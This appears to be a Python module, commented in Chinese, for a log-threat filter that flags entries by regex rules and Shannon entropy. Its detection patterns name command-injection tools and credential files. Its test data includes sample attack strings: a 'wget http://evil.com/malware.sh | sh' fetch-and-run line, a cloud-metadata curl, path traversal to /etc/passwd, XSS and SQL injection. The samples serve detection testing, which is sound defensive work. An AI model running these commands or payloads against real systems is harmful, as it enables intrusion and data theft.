import re
import math
import pandas as pd
import os


class FilterFunnel:
    """
    日志过滤器漏斗
    - 通过规则匹配筛选可疑日志
    - 通过熵值分析筛选可疑日志
    """

    def __init__(self, rules_file: str = None):
        """
        初始化过滤器
        
        Args:
            rules_file: 规则文件路径，默认为 configs/rules.regex
        """
        if rules_file is None:
            # 获取项目根目录
            current_dir = os.path.dirname(os.path.abspath(__file__))
            self.rules_file = os.path.join(current_dir, '..', 'configs', 'rules.regex')
        else:
            self.rules_file = rules_file
        
        self.rules = self._load_rules()

    def _load_rules(self) -> list:
        """加载规则文件"""
        rules = []
        
        # 确保文件存在
        if not os.path.exists(self.rules_file):
            # 创建默认规则文件
            self._create_default_rules()
        
        try:
            with open(self.rules_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    # 忽略空行和注释行
                    if line and not line.startswith('#'):
                        rules.append(re.compile(line))
        except Exception as e:
            print(f"加载规则文件失败: {e}")
        
        return rules

    def _create_default_rules(self):
        """创建默认规则文件"""
        default_rules = [
            r'(?i)(select|union|insert).*(from|into)',  # SQL注入
            r'(?i)(\.\.\/|%2e%2e\/|etc\/passwd)',       # 路径遍历
            r'(?i)(<script>|alert\(|onerror=)',          # XSS
            r'(?i)(;|`|\$\(|\|\|).*(id|whoami|cat |wget )',  # 命令注入
            r'(?i)(169\.254\.169\.254)',                # 云元数据
            r'(?i)(admin\'|\' OR |\'=\d+\' OR )'        # SQL注入变体
        ]
        
        # 确保目录存在
        os.makedirs(os.path.dirname(self.rules_file), exist_ok=True)
        
        with open(self.rules_file, 'w', encoding='utf-8') as f:
            f.write("# 威胁检测规则 (正则表达式)\n")
            f.write("# SQL注入检测\n")
            f.write(r"(?i)(select|union|insert).*(from|into)\n")
            f.write("# 路径遍历/LFI检测\n")
            f.write(r"(?i)(\.\.\/|%2e%2e\/|etc\/passwd)\n")
            f.write("# XSS检测\n")
            f.write(r"(?i)(<script>|alert\(|onerror=)\n")
            f.write("# 命令注入检测\n")
            f.write(r"(?i)(;|`|\$\(|\|\|).*(id|whoami|cat |wget )\n")
            f.write("# 云元数据访问检测\n")
            f.write(r"(?i)(169\.254\.169\.254)\n")
            f.write("# SQL注入变体\n")
            f.write(r"(?i)(admin\'|\' OR |\'=\d+\' OR )\n")

    @staticmethod
    def _shannon_entropy(s: str) -> float:
        """
        计算字符串的香农熵
        
        Args:
            s: 输入字符串
        
        Returns:
            熵值（越高表示随机性越强）
        """
        if not s:
            return 0.0
        
        # 统计字符频率
        freq = {}
        for char in s:
            freq[char] = freq.get(char, 0) + 1
        
        # 计算熵
        entropy = 0.0
        total = len(s)
        for count in freq.values():
            prob = count / total
            entropy -= prob * math.log2(prob)
        
        return entropy

    def suspicious_by_rules(self, df: pd.DataFrame) -> pd.DataFrame:
        """
        通过规则匹配筛选可疑日志
        
        Args:
            df: 输入的日志DataFrame
        
        Returns:
            匹配至少一条规则的行
        """
        if self.rules is None or len(self.rules) == 0:
            return df
        
        if 'payload_summary' not in df.columns:
            return df
        
        # 对每行检查是否匹配任何规则
        mask = df['payload_summary'].apply(
            lambda x: any(rule.search(str(x)) for rule in self.rules)
        )
        
        return df[mask].copy()

    def suspicious_by_entropy(self, df: pd.DataFrame, column: str = 'payload_summary', 
                              threshold: float = 4.5) -> pd.DataFrame:
        """
        通过熵值分析筛选可疑日志
        
        Args:
            df: 输入的日志DataFrame
            column: 计算熵值的列名
            threshold: 熵值阈值，高于此值视为可疑
        
        Returns:
            熵值 >= threshold 的行
        """
        if column not in df.columns:
            return df
        
        # 计算每行的熵值
        entropies = df[column].apply(lambda x: self._shannon_entropy(str(x)))
        
        return df[entropies >= threshold].copy()

    def filter(self, df: pd.DataFrame) -> pd.DataFrame:
        """
        执行过滤：先规则筛选，若结果为空则用熵筛选
        
        Args:
            df: 输入的日志DataFrame
        
        Returns:
            筛选后的可疑日志
        """
        if df is None or df.empty:
            return df
        
        # 如果规则列表为空，直接使用熵筛选
        if not self.rules:
            return self.suspicious_by_entropy(df)
        
        # 先尝试规则筛选
        rule_result = self.suspicious_by_rules(df)
        
        # 如果规则筛选结果不为空，返回结果
        if not rule_result.empty:
            return rule_result
        
        # 规则筛选结果为空，使用熵筛选
        return self.suspicious_by_entropy(df)


if __name__ == '__main__':
    # 测试
    test_data = pd.DataFrame([
        {'payload_summary': "SELECT * FROM users WHERE id=1"},
        {'payload_summary': "GET /index.php?page=../../etc/passwd"},
        {'payload_summary': "正常请求 /api/data?id=123"},
        {'payload_summary': "<script>alert('XSS')</script>"},
        {'payload_summary': "curl http://169.254.169.254/latest/meta-data/"},
        {'payload_summary': "wget http://evil.com/malware.sh | sh"},
        {'payload_summary': "admin' OR '1'='1"},
        {'payload_summary': "正常业务请求"}
    ])
    
    funnel = FilterFunnel()
    print("规则数:", len(funnel.rules))
    
    # 规则筛选测试
    rule_result = funnel.suspicious_by_rules(test_data)
    print("\n规则筛选结果:")
    print(rule_result)
    
    # 熵筛选测试
    entropy_result = funnel.suspicious_by_entropy(test_data)
    print("\n熵筛选结果:")
    print(entropy_result)
    
    # 综合筛选
    result = funnel.filter(test_data)
    print("\n综合筛选结果:")
    print(result)
